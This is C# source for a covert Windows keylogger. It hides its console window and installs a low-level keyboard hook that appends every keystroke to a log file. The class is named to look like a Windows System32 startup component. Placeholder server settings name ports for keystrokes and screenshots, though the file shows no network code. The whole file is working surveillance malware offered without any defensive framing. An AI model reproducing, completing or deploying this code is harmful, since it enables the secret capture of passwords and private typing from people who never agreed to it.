using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;

public static class Globals
{
    public static String serverIP = "~~~~~";
    public static Int32 keyPort = 40404;
    public static Int32 screenPort = 40405;   
}

public class Windows_System32_Startup
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc proc = HookFunc;
    private static IntPtr hookInt = IntPtr.Zero;
	private char[] userBuffer = new char[256];
    private int bufIndex = 0;
    static public void Main ()
    {
        var wind = GetConsoleWindow();
        ShowWindow(wind, SW_HIDE);
        hookInt = SetWindowsHookEx(WH_KEYBOARD_LL, proc, (IntPtr)null, 0);
        Application.Run();
        UnhookWindowsHookEx(hookInt);
    }
    
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static IntPtr HookFunc(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            StreamWriter sw = new StreamWriter(Application.StartupPath+ @"\log.txt",true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }
        return CallNextHookEx(hookInt, nCode, wParam, lParam);
    }
    
    //These Dll's will handle the hooks.

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
    LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
    IntPtr wParam, IntPtr lParam);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    // The two dll imports below will handle the window hiding.
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    const int SW_HIDE = 0;
}